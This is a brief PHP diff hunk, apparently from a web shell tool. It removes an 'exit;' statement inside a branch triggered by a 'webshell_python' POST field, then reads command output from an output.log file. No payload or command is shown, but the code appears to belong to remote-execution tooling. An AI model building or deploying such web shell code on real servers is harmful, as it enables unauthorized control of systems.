@@ -189,7 +189,6 @@ if(isset($_POST["webshell_python"])){
         flush();
         ob_flush();
         sleep(10);
-        exit;
     }
     if(fopen("./output.log", "r") !== null){
         $myfile = fopen("./output.log", "r"); 
